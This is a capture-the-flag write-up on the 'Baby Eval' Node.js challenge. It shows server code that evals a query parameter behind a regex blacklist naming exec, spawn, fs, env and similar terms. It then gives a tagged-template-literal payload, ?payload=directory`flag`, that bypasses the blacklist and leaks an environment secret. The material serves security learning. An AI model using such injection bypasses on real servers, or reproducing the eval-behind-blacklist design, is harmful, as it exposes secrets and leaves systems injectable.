# Baby Eval
## The App
Baby Eval is a Node app which has a path `/` which lists some information including the server source code. As seen in the code the information comes from the following function:

```javascript
function directory(keys) {
    const values = {
        "title": "View Source CTF",
        "description": "Powered by Node.js and Express.js",
        "flag": process.env.FLAG,
        "lyrics": "Good job, you’ve made it to the bottom of the mind control facility. Well done.",
        "createdAt": "1970-01-01T00:00:00.000Z",
        "lastUpdate": "2022-02-22T22:22:22.222Z",
        "source": require('fs').readFileSync(__filename),
    };

    return "<dl>" + keys.map(key => `<dt>${key}</dt><dd><pre>${escape(values[key])}</pre></dd>`).join("") + "</dl>";
}
```

The webpage is created here:
```javascript
const payload = req.query.payload;

if (payload && typeof payload === "string") {
    const matches = /([\.\(\)'"\[\]\{\}<>_$%\\xu^;=]|import|require|process|proto|constructor|app|express|req|res|env|process|fs|child|cat|spawn|fork|exec|file|return|this|toString)/gi.exec(payload);
    if (matches) {
        res.status(400).send(matches.map(i => `<code>${i}</code>`).join("<br>"));
    } else {
        res.send(`${eval(payload)}`);
    }
} else {
    res.send(directory(["title", "description", "lastUpdate", "source"]));
}
```

## Tried solutions
The goal was to get the flag. First I saw that the code can execute `eval` by entering a `payload` as the `GET` query parameter. I first did not see that the ReEx is a Blacklist, not a whitelist (stupid me), so many things don't work including calling functions because `(` and `)` are not allowed. Then I googled for a way to call a function without prenthesis. Found
```javascript
alert`hello`
```
and remembered that JavaScript Template Literals can have tags which are basically functions which first parameter is a list of strings. This list contains the parts of the string, split by the injection variables (`${x}`).

## Solution
```typescript
directory`flag`
```

```
?payload=directory`flag`
```

Because we don't have an injection variable, the argument of `directory` is just `[ "flag" ]`.